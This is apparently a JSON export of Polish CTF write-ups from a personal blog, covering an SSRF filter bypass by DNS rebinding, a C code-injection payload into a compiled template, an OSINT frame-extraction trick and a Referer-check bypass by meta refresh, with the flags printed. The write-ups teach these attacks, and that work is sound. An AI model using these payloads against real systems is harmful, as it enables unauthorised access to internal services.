[{"content":"Photo Archiver (39 rozwiązań)\nOpis tego zadania brzmi:\nDon\u0026rsquo;t you hate when a very cool page goes down and all of your bookmarked memes go down? That\u0026rsquo;s why I created a service to archive random URLs on the Internet.\nPonadto, kod źródłowy jest dostępny po odwiedzeniu strony podanej w zadaniu.\nAnaliza podatności Ominięcie ochrony przed SSRF Filtr SSRF próbuje blokować żądania do localhosta poprzez rozwiązanie nazwy hosta i sprawdzenie, czy jest to 127.0.0.1:\nresolved = resolve_domain(parsed.hostname) if not resolved: abort(400, \u0026#34;bad host\u0026#34;) logging.info(\u0026#34;resolved: %s\u0026#34;, resolved) if resolved == \u0026#34;127.0.0.1\u0026#34;: abort(400, \u0026#34;bad ip\u0026#34;) Jednak ten check jest zbyt wąski:\nBlokuje tylko 127.0.0.1, ale nie inne adresy pętli zwrotnej, takie jak 127.0.0.2, 127.0.0.3 itd. Domena wykorzystująca DNS rebinding może przekierowywać na 127.0.0.2, który nadal jest adresem pętli zwrotnej, ale nie jest dokładnie 127.0.0.1. Oznacza to, że można użyć dowolnego innego adresu z zakresu pętli zwrotnej (oprócz 127.0.0.1, który jest filtrowany), aby uzyskać dostęp do usług lokalnych, a filtr tego nie wykryje. Funkcja flagi Flaga jest chroniona przez następujący route:\n@app.route(\u0026#34;/flag\u0026#34;) def get_flag(): remote_ip = request.environ.get(\u0026#39;HTTP_X_REAL_IP\u0026#39;) if remote_ip and remote_ip != \u0026#34;127.0.0.1\u0026#34;: abort(401) return make_response(FLAG) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=23612) Endpoint /flag został zaprojektowany tak, aby zwracał flagę tylko wtedy, gdy żądanie wydaje się pochodzić z localhosta. Sprawdza nagłówek HTTP_X_REAL_IP i jeśli jest on nieustawiony lub ustawiony na 127.0.0.1, flaga zostaje zwrócona. W przeciwnym razie dostęp jest zabroniony.\nJednak gdy serwer sam wykonuje żądanie (tak jak w przypadku SSRF), ten nagłówek często w ogóle nie jest ustawiony lub żądanie jest widziane jako pochodzące z localhosta, co pozwala na zwrócenie flagi.\nExploit Aby wykorzystać tę podatność, należy podać następujący adres URL w polu Image URL:\nhttp://\u0026lt;dns-rebound-domain\u0026gt;:23612/flag#.png Serwer pobiera flagę i zapisuje ją jako obraz (\u0026lt;img src=\u0026quot;/image/flag\u0026quot;\u0026gt;) w pamięci Twojej sesji.\nNastępnie możesz wejść na /image/flag, aby pobrać flagę (zostanie pobrana jako plik; musisz otworzyć go w edytorze tekstu).\necsc25{TOCTOU-is-a-weird-acronym} Dlaczego to działa? Niepełny filtr SSRF blokuje tylko 127.0.0.1, a nie wszystkie adresy pętli zwrotnej (127.0.0.0/8). DNS rebinding pozwala wykorzystać kontrolowaną przez atakującego domenę DNS, która przekierowuje na adresy wewnętrzne lub pętli zwrotnej, omijając filtry SSRF sprawdzające jedynie 127.0.0.1. Endpoint /flag sprawdza nagłówek HTTP_X_REAL_IP. Ponieważ żądanie jest wykonywane lokalnie, ten nagłówek prawdopodobnie nie jest ustawiony lub ma wartość None, więc żądanie zostaje przepuszczone. Fragment # jest ignorowany przez protokół HTTP, więc serwer pobiera /flag, a nie /flag#.png. Końcówka .png pozwala przejść walidację rozszerzenia pliku. ","permalink":"https://manfcg.pl/pl/posts/ecsc25-photo-archiver/","summary":"\u003ch2 id=\"photo-archiver\"\u003ePhoto Archiver\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003e(39 rozwiązań)\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eOpis tego zadania brzmi:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eDon\u0026rsquo;t you hate when a very cool page goes down and all of your bookmarked memes go down? That\u0026rsquo;s why I created a service to archive random URLs on the Internet.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003ePonadto, \u003ca href=\"https://photo-archiver.ecsc25.hack.cert.pl/source\"\u003ekod źródłowy\u003c/a\u003e jest dostępny po odwiedzeniu strony podanej w zadaniu.\u003c/p\u003e\n\u003ch2 id=\"analiza-podatności\"\u003eAnaliza podatności\u003c/h2\u003e\n\u003ch3 id=\"ominięcie-ochrony-przed-ssrf\"\u003eOminięcie ochrony przed SSRF\u003c/h3\u003e\n\u003cp\u003eFiltr SSRF próbuje blokować żądania do localhosta poprzez rozwiązanie nazwy hosta i sprawdzenie, czy jest to \u003ccode\u003e127.0.0.1\u003c/code\u003e:\u003c/p\u003e","title":"ECSC 25 Polish Qualifications - Photo Archiver - Web challange"},{"content":"Caller (51 rozwiązań)\nOpis tego zadania brzmi:\nNaming things is hard.\nDodatkowo został dołączony netcat, który wykonuje:\nimport os import uuid def main(): FLAG = open(\u0026#34;flag.txt\u0026#34;, \u0026#39;r\u0026#39;).read().encode() arg = input(\u0026#34;\u0026gt; \u0026#34;) blacklist = [\u0026#39;{\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;\\n\u0026#39;] if len(arg) \u0026gt; 10 or any([c in arg for c in blacklist]): print(\u0026#34;Bad input!\u0026#34;) return template = f\u0026#34;\u0026#34;\u0026#34; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; char* f(){{ char* flag = \u0026#34;{FLAG}\u0026#34;; printf(\u0026#34;%s\u0026#34;,flag); return flag; }} void g(char* {arg}){{}} int main(){{ g(NULL); return 0; }} \u0026#34;\u0026#34;\u0026#34; name = \u0026#34;test\u0026#34; source = f\u0026#34;/tmp/{name}.c\u0026#34; outfile = f\u0026#34;/tmp/{name}\u0026#34; open(source, \u0026#39;w\u0026#39;).write(template) os.system(f\u0026#34;export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin \u0026amp;\u0026amp; gcc {source} -o {outfile}\u0026#34;) os.system(f\u0026#34;{outfile}\u0026#34;) os.remove(source) os.remove(outfile) main() Analiza podatności Input injection Luka tkwi w sposobie, w jaki dane wejściowe użytkownika są wstawiane bezpośrednio do deklaracji funkcji C jako nazwa parametru:\nvoid g(char* {arg}){{}} Chociaż istnieje blacklista do filtrowania znaków takich jak {, }, ; i \\n, aplikacja nie sprawdza, czy dane wejściowe stanowią prawidłowy identyfikator języka C. Prowadzi to do możliwości injectowania dowolnych wyrażeń w miejsce nazwy parametru, o ile dane wejściowe nie przekraczają 10 znaków i unikają znaków z blacklisty.\nFunkcja flagi Flaga jest przechowywana w funkcji f():\nchar* f(){ char* flag = \u0026#34;{FLAG}\u0026#34;; printf(\u0026#34;%s\u0026#34;,flag); return flag; } Musimy znaleźć sposób na wywołanie tej funkcji w czasie wykonywania.\nExploit Ponieważ dane wprowadzone przez użytkownika są wstawiane bezpośrednio jako nazwa parametru (bez cudzysłowów ani escapingu), możemy wykorzystać fakt, że język C pozwala na wywołania funkcji lub wyrażenia w nawiasach używanych do indeksowania tablic lub operacji na wskaźnikach.\nNa przykład, ten input:\nf[!f()] Zostaje zinjectowany jako:\nvoid g(char* f[!f()]) { } To skutkuje:\nWywołaniem funkcji f() podczas obliczania wyrażenia indeksowania tablicy - co powoduje wypisanie flagi (printf(\u0026quot;%s\u0026quot;,flag);). Wynik !f() jest używany jako indeks tablicy. Nie zależy nam jednak na jego wartości - potrzebujemy jedynie efektu ubocznego, jakim jest wywołanie funkcji f(). \u0026gt; f[!f()] b\u0026#39;ecsc25{thats_some_weird_variable_name}\u0026#39; Dlaczego to działa? Kod się kompiluje, ponieważ język C pozwala na użycie wyrażeń takich jak type name[expression] w deklaracjach parametrów. f[!f()] wygląda jak tablica pointerów o nazwie f i rozmiarze !f(), ale w rzeczywistości f() jest wywoływana podczas obliczania tego wyrażenia. Wyrażenie !f() przekształca wartość zwracaną przez f() (non-null pointer) na boole\u0026rsquo;a, a następnie ją neguje. Kluczowe jest to, że podczas obliczania !f() następuje wywołanie funkcji f(). Ponieważ f() zawiera printf(\u0026quot;%s\u0026quot;, flag);, każde obliczenie !f() powoduje wypisanie flagi, nawet jeśli wynik logiczny (0 lub 1) nie ma znaczenia dla logiki programu. Ominięcie blacklisty: Ponieważ f[!f()] nie zawiera nawiasów klamrowych {}, średników ; ani end of lineów i ma mniej niż 10 znaków, omija prosty filtr wejścia, w pełni wykorzystując reguły typów i wyrażeń języka C. ","permalink":"https://manfcg.pl/pl/posts/ecsc25-caller/","summary":"\u003ch2 id=\"caller\"\u003eCaller\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003e(51 rozwiązań)\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eOpis tego zadania brzmi:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eNaming things is hard.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eDodatkowo został dołączony \u003ca href=\"https://ctf101.org/faq/connecting-to-services/\"\u003enetcat\u003c/a\u003e, który wykonuje:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003eos\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003euuid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eFLAG\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;flag.txt\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;r\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eencode\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003earg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026gt; \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eblacklist\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;{\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;}\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earg\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e \u003cspan class=\"ow\"\u003eor\u003c/span\u003e \u003cspan class=\"nb\"\u003eany\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003earg\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003eblacklist\u003c/span\u003e\u003cspan class=\"p\"\u003e]):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Bad input!\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003etemplate\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sa\"\u003ef\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e#include \u0026lt;stdio.h\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e#include \u0026lt;string.h\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003echar* f()\u003c/span\u003e\u003cspan class=\"se\"\u003e{{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    char* flag = \u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eFLAG\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    printf(\u0026#34;%s\u0026#34;,flag);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    return flag;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u003c/span\u003e\u003cspan class=\"se\"\u003e}}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003evoid g(char* \u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003earg\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e)\u003c/span\u003e\u003cspan class=\"se\"\u003e{{}}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eint main()\u003c/span\u003e\u003cspan class=\"se\"\u003e{{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    g(NULL);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    return 0;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u003c/span\u003e\u003cspan class=\"se\"\u003e}}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;test\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003esource\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sa\"\u003ef\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/tmp/\u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e.c\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eoutfile\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sa\"\u003ef\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/tmp/\u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esource\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;w\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etemplate\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eos\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esystem\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sa\"\u003ef\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin \u0026amp;\u0026amp; gcc \u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003esource\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e -o \u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eoutfile\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eos\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esystem\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sa\"\u003ef\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eoutfile\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eos\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eremove\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esource\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eos\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eremove\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eoutfile\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"analiza-podatności\"\u003eAnaliza podatności\u003c/h2\u003e\n\u003ch3 id=\"input-injection\"\u003eInput injection\u003c/h3\u003e\n\u003cp\u003eLuka tkwi w sposobie, w jaki dane wejściowe użytkownika są wstawiane bezpośrednio do deklaracji funkcji C jako nazwa parametru:\u003c/p\u003e","title":"ECSC 25 Polish Qualifications - Caller - Misc challange"},{"content":"Wprowadzenie Rozwiązałem challange osintowy o nazwie \u0026ldquo;Noticed?\u0026rdquo; z CTFa 1753CTF, więcej informacji o tym CTFie można znaleźć tutaj\nNoticed? Nie ukrywam, że był to ciekawy challange. Miałem pokazany sam tekst i z niego trzeba było wyciągnąć flagę.\nNo, ale ten tekst był z teasera 1753ctf, którego oglądałem - więc od razu po zobaczeniu tego tekstu wszedłem na youtube\nZastanawiałem się co zrobić z tym filmikiem. Obejrzałem go kilkanaście razy, googlowałem po platformach społecznościowych, ale ciągle bez flagi.\nLecz po chwilii uznałem, że obejrzę go klatka po klatce, bo może flaga ukryta jest gdzieś na poszczególnej klatce.\nPobrałem ten filmik, użyłem opcji ffmpega i wyekstraktowałem każdą klatkę:\nffmpeg -i ctf.mp4 frame_%00004d.jpg No i przeglądając każdą z klatkę, znalazłem tą na której jest flaga, czyli klatkę numer 1444\n1753c{I_b3c4m3_a_h4ck3r}\n","permalink":"https://manfcg.pl/pl/posts/1753ctf-noticed/","summary":"\u003ch2 id=\"wprowadzenie\"\u003eWprowadzenie\u003c/h2\u003e\n\u003cp\u003eRozwiązałem challange osintowy o nazwie \u0026ldquo;Noticed?\u0026rdquo; z CTFa 1753CTF, więcej informacji o tym CTFie można znaleźć \u003ca href=\"https://ctftime.org/event/2639/\"\u003etutaj\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"osint_noticed\" loading=\"lazy\" src=\"/pl/posts/1753ctf-noticed/osint_noticed.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"noticed\"\u003eNoticed?\u003c/h2\u003e\n\u003cp\u003eNie ukrywam, że był to ciekawy challange. Miałem pokazany sam tekst i z niego trzeba było wyciągnąć flagę.\u003c/p\u003e\n\u003cp\u003eNo, ale ten tekst był z teasera 1753ctf, którego oglądałem - więc od razu po zobaczeniu tego tekstu wszedłem na \u003ca href=\"https://www.youtube.com/watch?v=yRghHj9dkoo\"\u003eyoutube\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eZastanawiałem się co zrobić z tym filmikiem. Obejrzałem go kilkanaście razy, googlowałem po platformach społecznościowych, ale ciągle bez flagi.\u003c/p\u003e","title":"1753CTF 2025 - Noticed? - OSINT challange"},{"content":"Wprowadzenie Rozwiązałem challange \u0026ldquo;Editor\u0026rdquo; który jest w kategorii Web. Więcej informacji o tym CTFie można znaleźć tutaj\nEditor Wszedłem na stronę, która znajdowała się w opisie challange\u0026rsquo;u i wyświetlił mi się tekst \u0026ldquo;Forbidden\u0026rdquo;\nSkonfigurowałem serwer webowy lokalnie, pobierając załącznik, a następnie przechodząc do backendu i wpisując python server.py\nwszedłem na stronę, którą zhostowałem lokalnie (i ponownie Forbidden)\nsprawdziłem source code tej strony\ni dodałem następujący fragment kodu do \u0026lt;head\u0026gt;\n\u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;0;url=http://chals.swampctf.com:47821/flag.txt\u0026#34;\u0026gt; Po tym pojawiła się flaga:\nswampCTF{c55_qu3r135_n07_j5}\nDlaczego to działa? Wstawiłem meta tag do HTML: \u0026lt;meta http-equiv=\u0026quot;refresh\u0026quot; content=\u0026quot;X;url=Y\u0026quot;\u0026gt; który mówi przeglądarce, by przekierowała stronę, content=\u0026quot;0\u0026quot; oznacza natychmiastowe przekierowanie (0 sekund delay\u0026rsquo;u), url=http://chals.swampctf.com:47821/flag.txt wskazuje lokalizację przekierowania. W tym przypadku jest to również miejsce gdzie znajduje się flaga. Gdy strona renderuje HTML: Przeglądarka myśli, że ładuje zwykłą stronę, meta refresh zmusza przeglądarkę do zrobienia redirecta, czyli do przejścia w lokalizację flagi. Obejście restrykcji serwera Flask: Flask sprawdza header Referer, by zablokować bezpośredni dostęp do plików, Ponieważ jednak meta refresh pochodzi z dozwolonego źródła (mojej lokalnie hostowanej witryny), serwer traktuje je jako prawidłowe żądanie, Przeglądarka podąża za redirectem i wyświetla flagę. ","permalink":"https://manfcg.pl/pl/posts/swamp-editor/","summary":"\u003ch2 id=\"wprowadzenie\"\u003eWprowadzenie\u003c/h2\u003e\n\u003cp\u003eRozwiązałem challange \u0026ldquo;Editor\u0026rdquo; który jest w kategorii Web. Więcej informacji o tym CTFie można znaleźć \u003ca href=\"https://ctftime.org/event/2573\"\u003etutaj\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Editor\" loading=\"lazy\" src=\"/pl/posts/swamp-editor/editor.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"editor\"\u003eEditor\u003c/h2\u003e\n\u003cp\u003eWszedłem na stronę, która znajdowała się w opisie challange\u0026rsquo;u i wyświetlił mi się tekst \u0026ldquo;Forbidden\u0026rdquo;\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"forbidden\" loading=\"lazy\" src=\"/pl/posts/swamp-editor/forbidden.png\"\u003e\u003c/p\u003e\n\u003cp\u003eSkonfigurowałem serwer webowy lokalnie, pobierając załącznik, a następnie przechodząc do backendu i wpisując \u003ccode\u003epython server.py\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003ewszedłem na stronę, którą zhostowałem lokalnie (i ponownie Forbidden)\u003c/p\u003e\n\u003cp\u003e\u003cimg 